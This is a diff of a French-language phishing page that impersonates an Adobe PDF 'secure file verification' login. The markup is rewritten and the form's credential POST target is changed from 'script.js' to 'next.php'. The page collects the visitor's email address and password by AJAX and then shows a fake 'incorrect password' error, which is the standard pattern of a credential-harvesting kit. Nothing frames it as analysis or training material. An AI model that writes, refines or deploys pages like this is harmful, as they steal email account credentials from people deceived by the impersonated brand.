@@ -1,164 +1,229 @@
 <!doctype html>
-<html lang="fr">
+<html lang="en">
 <head>
-  <!-- Chargement de jQuery et Bootstrap avec les bonnes versions -->
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-
   <!-- Meta tags -->
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
-  <!-- CSS Bootstrap et Police -->
+  <!-- Bootstrap CSS -->
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
   <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
-  <link href="css/hover.css" rel="stylesheet" media="all">
-
-  <!-- Font Awesome -->
+  
+  <!-- FontAwesome Icons -->
   <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
-
-  <!-- Titre de la page -->
+  
+  <!-- Title -->
   <title>Adobe PDF accès en ligne</title>
 
-  <!-- Style CSS -->
+  <!-- Custom CSS -->
+  <link href="css/hover.css" rel="stylesheet" media="all">
   <style type="text/css">
-    textarea:hover, input:hover, textarea:active, input:active, textarea:focus, input:focus, select:focus, button:focus, button:active, button:hover, .btn:active, .btn.active {
-      outline:0px !important;
-      -webkit-appearance:none;
+    /* Custom Styles */
+    textarea:hover, textarea:active, input:active, textarea:focus, input:focus, select:focus, button:focus, button:active, button:hover, .btn:active, .btn.active {
+      outline: 0px !important;
       box-shadow: none !important;
     }
 
-    .input-icons i { position: absolute; }
-    .input-icons { width: 100%; }
-    .icon { padding: 15px; min-width: 40px; color: #8FA7AD; }
-    .input-field { width: 100%; padding: 7px; border-radius: 0px; padding-left: 20px; text-align: left; border: 1px solid #B7B7B7; }
-    .submit-btn { box-shadow: inset 0px 34px 0px -15px #b54b3a; background-color: #a73f2d; border-radius: 16px; border: 1px solid #b34332; display: inline-block; cursor: pointer; color: #ffffff; font-family: Arial; font-size: 15px; font-weight: bold; padding: 9px 23px; text-decoration: none; text-shadow: 0px -1px 0px #7a2a1d; }
-    .submit-btn:hover { background-color: #b34332; }
-    .submit-btn:active { position: relative; top: 1px; }
-  </style>
-</head>
+    .input-icons i {
+      position: absolute;
+    }
 
+    .input-icons {
+      width: 100%;
+    }
+
+    .icon {
+      padding: 15px;
+      min-width: 40px;
+      color: #8FA7AD;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 7px;
+      border-radius: 0;
+      padding-left: 20px;
+      text-align: left;
+      border: 1px solid #B7B7B7;
+    }
+
+    .submit-btn {
+      box-shadow: inset 0px 34px 0px -15px #b54b3a;
+      background-color: #a73f2d;
+      border-radius: 16px;
+      border: 1px solid #b34332;
+      display: inline-block;
+      cursor: pointer;
+      color: #fff;
+      font-family: Arial;
+      font-size: 15px;
+      font-weight: bold;
+      padding: 9px 23px;
+      text-decoration: none;
+      text-shadow: 0px -1px 0px #7a2a1d;
+    }
+
+    .submit-btn:hover {
+      background-color: #b34332;
+    }
+
+    .submit-btn:active {
+      position: relative;
+      top: 1px;
+    }
+
+    /* Centering content and adding padding */
+    .container-fluid {
+      padding: 0;
+    }
+
+    .container {
+      background-color: #A50E01;
+    }
+
+    .text-dark {
+      color: #524040;
+    }
+
+    .mt-4, .mt-5, .mt-3 {
+      margin-top: 20px;
+    }
+
+    .text-center {
+      text-align: center;
+    }
+
+  </style>
+
+  <!-- jQuery and Bootstrap JS (Moved to the end for better loading performance) -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</head>
 <body style="background-image: url('images/bg21.jpg'); background-size: cover; background-repeat: no-repeat;">
-  <div class="container-fluid p-0">
-    <div class="container-fluid" style="background-color: #A50E01;">
-      <div class="row">
-        <div class="col-lg-11 mx-auto my-1 p-2">
-          <div class="p-2">
-            <img src="images/adobe1-w.png" class="img-fluid" width="50px">
-            <span class="h3 text-white align-middle">Adobe PDF accès en ligne</span>
-          </div> 
+
+  <!-- Header -->
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-11 mx-auto my-1 p-2">
+        <div class="p-2">
+          <img src="images/adobe1-w.png" class="img-fluid" width="50px">
+          <span class="h3 text-white align-middle">Adobe PDF accès en ligne</span>
         </div>
       </div>
     </div>
+  </div>
 
-    <div class="container-fluid">
-      <div class="row" style="margin: 100px 0px;">
-        <div class="col-lg-5 mx-auto">
-          <div style="background-color: white; border-radius: 5px; padding: 40px;">
-            <div class="col-lg-12 p-0">
-              <img src="images/logo.png" class="img-fluid" width="50px;">
-              <span class="align-middle" style="color: #FF4027; font-size: 25px; font-weight: 500;">Vérification sécurisée des fichiers Adobe</span>
-            </div>
-            
-            <!-- Options radio -->
-            <div class="form-check mt-3">
-              <label class="form-check-label" style="color: #524040;">
-                <input type="radio" checked="checked" class="form-check-input" name="optradio">Voir le fichier en ligne.
-              </label>
-            </div>
-            <div class="form-check mt-1">
-              <label class="form-check-label" style="color: #524040;">
-                <input type="radio" class="form-check-input" name="optradio">Télécharger le fichier.
-              </label>
-            </div>
-            <div class="form-check mt-1">
-              <label class="form-check-label" style="color: #524040;">
-                <input type="radio" class="form-check-input" name="optradio">Transférer le fichier.
-              </label>
-            </div>
+  <!-- Main Content -->
+  <div class="container">
+    <div class="row" style="margin: 100px 0;">
+      <div class="col-lg-5 mx-auto">
+        <div class="p-5" style="background-color: white; border-radius: 5px;">
+          <div class="col-lg-12 p-0">
+            <img src="images/logo.png" class="img-fluid" width="50px;">
+            <span class="align-middle" style="color: #FF4027; font-size: 25px; font-weight: 500;">Vérification sécurisée des fichiers Adobe</span>
+          </div>
 
-            <!-- Formulaire de connexion -->
-            <div class="mt-4 mx-auto">
-              <center>
-                <div class="alert alert-danger" id="msg" style="display: none;"></div>
-                <span id="error" class="text-danger" style="display: none;">Identifiant ou mot de passe incorrect</span>
-              </center>
-              <form id="contact" class="form-horizontal well">
-                <div id="div1" class="text-dark">
-                  <div>
-                    <div class="form-group m-0">
-                      <label for="email" class="font-weight-bold">Votre adresse e-mail</label>
-                      <div class="input-icons">
-                        <input type="email" name="email" class="input-field" id="email" placeholder="Votre e-mail" required>
-                      </div>
-                    </div>
-                  </div>
-                  <div class="mt-4">
-                    <div class="form-group m-0">
-                      <label for="password" class="font-weight-bold">Mot de passe</label>
-                      <div class="input-icons">
-                        <input type="password" name="password" class="input-field" id="password" placeholder="Votre mot de passe" required>
-                      </div>
-                    </div>
+          <!-- Radio Buttons -->
+          <div class="form-check mt-3">
+            <label class="form-check-label" style="color: #524040;">
+              <input type="radio" checked="checked" class="form-check-input" name="optradio">Voir le fichier en ligne.
+            </label>
+          </div>
+          <div class="form-check mt-1">
+            <label class="form-check-label" style="color: #524040;">
+              <input type="radio" class="form-check-input" name="optradio">Télécharger le fichier.
+            </label>
+          </div>
+          <div class="form-check mt-1">
+            <label class="form-check-label" style="color: #524040;">
+              <input type="radio" class="form-check-input" name="optradio">Transférer le fichier.
+            </label>
+          </div>
+
+          <!-- Form for Email and Password -->
+          <div class="mt-4">
+            <div class="alert alert-danger" id="msg" style="display: none;"></div>
+            <span id="error" class="text-danger" style="display: none;">Identifiant ou mot de passe incorrect</span>
+            <form id="contact" class="form-horizontal well">
+              <div class="form-group m-0">
+                <label class="font-weight-bold">Votre adresse e-mail</label>
+                <div class="input-icons">
+                  <input type="email" name="email" class="input-field" id="email" placeholder="">
+                </div>
+              </div>
+              <div class="mt-4">
+                <div class="form-group m-0">
+                  <label class="font-weight-bold">Mot de passe</label>
+                  <div class="input-icons">
+                    <input type="password" name="password" class="input-field" id="password" placeholder="">
                   </div>
                 </div>
-                <div class="text-center col-lg-10 mx-auto mt-5">
-                  <button class="submit-btn" id="submit-btn">Connectez-vous pour afficher le fichier</button>
-                </div>
-                <div class="mt-4 text-center" style="font-size: 14px">
-                  <span>Pour accéder à notre page de documents sécurisés en ligne, vous devez vous connecter à votre adresse e-mail afin de nous permettre de vérifier votre légitimité. L'accès illimité est interdit.</span>
-                </div>
-              </form>
+              </div>
+            </form>
+
+            <!-- Submit Button -->
+            <div class="text-center col-lg-10 mx-auto mt-5">
+              <button class="submit-btn" id="submit-btn">Connectez-vous pour afficher le fichier</button>
+            </div>
+
+            <!-- Info Text -->
+            <div class="mt-4 text-center" style="font-size: 14px">
+              <span>Pour accéder à notre page de documents sécurisés en ligne, vous devez vous connecter à votre adresse e-mail, afin de nous permettre de vous assurer que vous êtes le destinataire légitime du fichier protégé. L'accès illimité est interdit.</span>
             </div>
           </div>
-        </div> 
-      </div> 
+        </div>
+      </div>
     </div>
+  </div>
 
-    <!-- Scripts JavaScript -->
-    <script>
-      $(document).ready(function() {
-        $('#submit-btn').click(function(event) {
-          event.preventDefault();
+  <!-- jQuery Logic -->
+  <script>
+    $(document).ready(function() {
+      var count = 0;
 
-          // Récupération des données du formulaire
-          var email = $("#email").val();
-          var password = $("#password").val();
-          
-          // Validation de l'email avec une expression régulière
-          var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-          if (!emailRegex.test(email)) {
-            $('#error').show().text("Veuillez entrer un e-mail valide.");
-            return;
-          } else {
-            $('#error').hide();
-          }
+      // Handle form submission
+      $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email = $("#email").val();
+        var password = $("#password").val();
 
-          // Envoi des données avec Ajax
-          $.ajax({
-            url: 'script.js',
-            type: 'POST',
-            data: { email: email, password: password },
-            beforeSend: function() {
-              $('#submit-btn').html('Vérification...');
-            },
-            success: function(response) {
-              if(response.signal === 'ok') {
-                $('#msg').html(response.msg).show();
-                // Redirection ou action selon la réponse du serveur
-              } else {
-                $('#msg').html(response.msg).show();
-              }
-            },
-            error: function() {
-              $('#msg').html("Erreur, identifiant ou mot de passe incorrect").show();
-            },
-            complete: function() {
-              $('#submit-btn').html('Se connecter');
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(email)) {
+          $('#error').show();
+          return false;
+        }
+
+        $.ajax({
+          dataType: 'JSON',
+          url: 'next.php',
+          type: 'POST',
+          data: { email: email, password: password },
+          beforeSend: function(xhr) {
+            $('#submit-btn').html('Verifing...');
+          },
+          success: function(response) {
+            if (response && response['signal'] == 'ok') {
+              $('#msg').show().html(response['msg']);
+            } else {
+              $('#msg').show().html(response['msg']);
             }
-          });
+          },
+          error: function() {
+            $("#msg").show().html("Identifiant ou mot de passe incorrect");
+          },
+          complete: function() {
+            $('#submit-btn').html('Voir le fichier en ligne');
+          }
         });
       });
-    </script>
+    });
+  </script>
 </body>
 </html>
